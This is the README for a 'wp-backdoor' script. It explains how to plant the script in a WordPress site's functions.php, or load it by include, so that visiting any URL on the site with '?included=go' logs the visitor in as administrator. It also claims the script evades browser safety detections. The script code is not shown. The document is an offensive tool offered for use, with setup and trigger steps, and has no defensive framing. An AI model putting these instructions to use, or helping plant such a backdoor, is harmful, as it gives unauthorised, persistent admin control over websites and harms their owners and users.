# wp-backdoor
simple wp script for wordpress backdoor access
----------------------------------------------------------------------------
this little script when run, bypasses browser safety detections
&  creates a backdoor that you can use to access a wordpress website as an admin

so, all you need to do to trigger the site is ::

visit the url of the website then add the following words ?included=go

so... for example ::: https://www.abcd.co.ke?included=go


this will automatically log you in as  the admin 

------------------------------------------------------------------------------

Disclaimer

to use this script, you have to copy it somewhere in the functions.php file of wordpress 
 
** you can also use::  php include_once  <path/to /file> command ... aslong as the
url is in functions.php,then  call this script.

----------------------------------------------------------------------------------

